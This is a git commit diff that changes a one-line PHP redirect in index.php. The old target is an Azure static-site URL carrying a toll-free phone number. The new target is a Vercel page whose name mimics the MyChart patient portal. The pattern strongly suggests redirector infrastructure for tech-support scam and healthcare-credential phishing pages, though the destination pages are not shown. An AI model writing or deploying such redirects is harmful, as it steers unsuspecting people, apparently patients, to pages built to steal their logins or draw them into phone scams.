2612a11ba074e1555873437473ede64e6b7a9351
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-30 22:18:29 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://ithih8c8wsndju8dndis9sjd.z33.web.core.windows.net/index.html?Aniph=1-833-785-2301");
+header("Location: https://realhopemychartonliners.vercel.app/index2.html");
 
 exit;
 ?>
